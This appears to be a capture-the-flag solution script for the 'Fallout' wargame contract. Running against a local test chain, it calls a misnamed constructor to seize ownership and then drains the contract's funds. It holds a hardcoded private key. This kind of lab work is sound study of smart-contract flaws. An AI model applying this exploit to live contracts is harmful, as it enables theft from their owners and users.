// @format

const Web3 = require('web3');
const Tx = require('ethereumjs-tx');

const fallout = require('./build/contracts/Fallout.json');

(async function pwn() {
  // Note that we're not using the deployment keys of the truffle here.
  var privateKey =
    'a3ade3bffea3a3af6c4fdcb7305a3f26a2baff5b97e2f061fadebb9215b6460b';
  var publicKey = '0x03e2edce4bb10110c3b75d14737100c0c34f7199';

  const provider = new Web3.providers.HttpProvider('http://localhost:8545');
  const web3 = new Web3(provider);
  const networkId = await web3.eth.net.getId();
  const contractAddress = fallout.networks[networkId].address;
  const contract = new web3.eth.Contract(fallout.abi, contractAddress);

  // As the constructor is wrongly named, the contract wasn't initialized when
  // it was deployed. By calling the wrongly named constructor, we make ourself
  // the owner.
  console.log("Calling 'Fal1out' function to make ourselves the owner");
  const fal1out = await contract.methods
    .Fal1out()
    .send({from: publicKey});

  // We can then conveniently call collectAllocations as we're the owner.
  console.log("Calling 'collectAllocations' to drain the contract");
  await contract.methods.collectAllocations().send({from: publicKey});
})();
